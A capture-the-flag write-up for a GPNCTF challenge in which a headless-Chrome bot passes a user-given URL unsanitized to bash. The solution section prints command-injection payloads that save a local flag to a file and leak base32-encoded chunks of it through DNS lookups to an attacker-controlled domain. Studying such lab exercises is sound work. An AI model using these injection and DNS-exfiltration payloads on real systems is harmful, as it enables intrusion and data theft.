# Even More Flags

## Challenge Description
I heard you like flags, so I launched Chrome with a lot of flags again so you can get your flag!
This time the flag is localhost:1337/flag, and the bot will visit your URL!

## Getting Started
This is a continuation of [so-many-flags](../so-many-flags), with the main differences being it now accepts a url to make chrome browse to, and the flag is now only accessible through the `/flag` endpoint. Note that `/flag` will only send the flag when accessed locally, so we cannot just request a flag.

Let's start out with sending 'https://google.com' and see if we notice anything interesting.

Hmm it looks like they aren't doing anything to change the input before it is passed to bash. Looks like command injection to me.

## Solution
I decided to go with blind command injection over DNS since I had access to Burp Collaborator, though exfil over HTTP should have worked just as well. I was having trouble just requesting the flag and sending it back (not getting dns requests when retrieving it), which made me think it was too long, so I broke up the payload into 3 parts: 1 to store the flag in a file, one to get the first part, and one to get the second part.
```
https://google.com; wget -qO - http://127.0.0.1:1337/flag > /tmp/loot
https://google.com; getent hosts $(cat /tmp/loot | head -c 35 | base32 | tr -d =).attacker-controlled-domain.com
https://google.com; getent hosts $(cat /tmp/loot | tail -c 35 | base32 | tr -d =).attacker-controlled-domain.com
```

## Flag
This resulted in 2 DNS queries with the 2 parts of the flag, base32 encoded
```
root@a0b287753e55:/app# echo I5IE4Q2UIZ5VOSCZL5CDAXZVGBGTGXZQIZPVISBTGUZV6RSMGRDTKXZT | base32 -d ; echo
GPNCTF{WHY_D0_50M3_0F_TH353_FL4G5_3
root@a0b287753e55:/app# echo IQYF6NJQJUZV6MCGL5KEQMZVGNPUMTBUI42V6M2WGNHF6M2YGE2VI7IK | base32 -d; echo
D0_50M3_0F_TH353_FL4G5_3V3N_3X15T}
```